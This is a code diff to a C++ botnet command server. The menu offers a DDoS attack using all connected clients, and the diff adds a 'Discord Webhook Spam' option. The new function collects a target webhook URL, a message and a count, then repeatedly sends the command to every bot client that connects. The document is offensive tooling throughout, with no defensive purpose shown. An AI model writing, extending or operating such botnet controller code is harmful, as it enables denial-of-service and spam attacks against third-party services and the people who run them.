@@ -43,6 +43,11 @@ void ClearBuffer() {
 	memset(buffer, 0, sizeof(buffer));
 }
 
+void ClearStringStream() {
+	ss.str("");
+	ss.clear();
+}
+
 void RestartSock() {
 	closesocket(sock);
 	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -90,11 +95,12 @@ _______ _______  ______        ______   _____   ______  ______ _______
 
 int Menu() {
 	cout << BLUE << R""""(
-+--------+-------+----------------------------------------------------+
-| Option | Name  |                    Description                     |
-+--------+-------+----------------------------------------------------+
-|      1 | DDoS  | Makes a DDoS attack with all the connected clients |
-+--------+-------+----------------------------------------------------+
++--------+----------------------+--------------------------------------------------------+
+| Option |         Name         |                      Description                       |
++--------+----------------------+--------------------------------------------------------+
+|      1 | DDoS                 | Makes a DDoS attack with all the connected clients     |
+|      2 | Discord Webhook Spam | Spams a Discord webhook with all the connected clients |
++--------+----------------------+--------------------------------------------------------+
 
 )"""";
 	int opt;
@@ -119,12 +125,46 @@ void SendAttack() {
 	}
 }
 
+void SpamDiscordWebhook() {
+	cout << RED "Enter the discord webhook you want to spam: " GREEN;
+	cin.getline(buffer, sizeof(buffer));
+	ss << buffer; char webhook[1024]; ss >> webhook;
+	ClearStringStream();
+	ClearBuffer();
+	cout << endl << RED "Enter the message for sending: " GREEN;
+	cin.getline(buffer, sizeof(buffer));
+	ss << buffer; char msg[1024]; ss >> msg;
+	ClearStringStream();
+	ClearBuffer();
+	cout << endl << RED "Enter the message quantity: " GREEN;
+	cin.getline(buffer, sizeof(buffer));
+	ss << buffer; char quant[1024]; ss >> quant;
+	ClearStringStream();
+	ClearBuffer();
+
+	char opt[1024] = "2";
+
+	while (true) {
+		SOCKET client = accept(sock, NULL, NULL);
+		send(client, opt, sizeof(opt), 0);
+		send(client, webhook, sizeof(webhook), 0);
+		send(client, msg, sizeof(msg), 0);
+		send(client, quant, sizeof(quant), 0);
+	}
+}
+
 int main() {
 	Startup();
 	int opt = Menu();
 	switch (opt) {
 	case 1:
 		SendAttack();
+		break;
+	case 2:
+		SpamDiscordWebhook();
+		break;
+	default:
+		cout << "Invalid option given" << endl;
 		break;
 	}
 
